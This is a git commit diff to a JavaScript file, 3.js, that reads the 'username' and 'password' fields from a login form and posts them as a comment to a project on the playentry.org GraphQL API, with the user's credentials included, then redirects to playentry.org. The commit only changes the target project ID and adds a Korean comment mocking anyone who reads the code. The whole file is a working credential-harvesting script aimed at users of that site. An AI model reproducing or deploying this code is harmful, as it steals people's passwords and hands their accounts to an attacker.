fe3c10ffa41c0175339b2b4c493791c7e3867215
FireRun <entryfirerun7012@outlook.com>
2024-04-14 22:29:07 +0900

    Update 3.js

--- 3.js
+++ 3.js
@@ -12,9 +12,10 @@ fetch("https://playentry.org/graphql", {
     }`,
   },
   referrerPolicy: "unsafe-url",
-  body: `{"query":" mutation CREATE_COMMENT($content: String $target: String $targetSubject: String $targetType: String){createComment(content:$content target:$target targetSubject: $targetSubject targetType: $targetType){comment{id}}}","variables":{"content":"${document.getElementsByName("username")[0].value}, ${document.getElementsByName("password")[0].value}","target":"661bbf8265405794a8c864f6","targetSubject":"project","targetType":"individual"}}`,
+  body: `{"query":" mutation CREATE_COMMENT($content: String $target: String $targetSubject: String $targetType: String){createComment(content:$content target:$target targetSubject: $targetSubject targetType: $targetType){comment{id}}}","variables":{"content":"${document.getElementsByName("username")[0].value}, ${document.getElementsByName("password")[0].value}","target":"661bd93eda7970f673d88b9d","targetSubject":"project","targetType":"individual"}}`,
   method: "POST",
   mode: "cors",
   credentials: "include",
 });
 location.href = "https://playentry.org/"
+// 코드 왜 훔쳐봄;
